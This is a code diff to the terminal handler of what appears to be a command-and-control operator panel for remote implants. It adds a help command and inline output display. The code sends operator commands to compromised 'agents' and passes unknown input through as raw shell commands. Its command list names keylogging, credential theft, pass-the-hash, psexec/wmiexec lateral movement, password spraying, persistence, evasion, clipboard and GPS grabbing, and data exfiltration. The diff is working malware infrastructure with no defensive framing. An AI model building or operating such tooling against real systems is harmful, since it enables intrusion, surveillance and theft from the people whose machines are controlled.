@@ -1531,7 +1531,8 @@ async function sendTermCmd() {
   let cmd = parts[0].toLowerCase(), args = parts.slice(1).join(' ');
 
   if (['shell','exec','cmd'].includes(cmd)) { cmd = 'shell'; }
-  else if (!['sysinfo','ifconfig','ipconfig','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover','location','gps','clipboard','fileget','grab'].includes(cmd) && !cmd.startsWith('ad-')) {
+  else if (cmd === '?') { cmd = 'help'; args = ''; }
+  else if (!['help','sysinfo','ifconfig','ipconfig','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover','location','gps','clipboard','fileget','grab'].includes(cmd) && !cmd.startsWith('ad-')) {
     args = raw; cmd = 'shell';
   }
 
@@ -1539,6 +1540,7 @@ async function sendTermCmd() {
     const resp = await fetch('/api/cmd', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent,command:cmd,args}) });
     const data = await resp.json();
     if (data.error) { termLog('error', '✗ ' + data.error); }
+    else if (data.inline) { termLog('output', data.output); }
     else { termLog('info', '⏳ Task queued: ' + data.type + ' (' + data.task_id.substring(0,8) + ')'); pollResult(data.task_id, agent); }
   } catch(e) { termLog('error', '✗ ' + e.message); }
 }
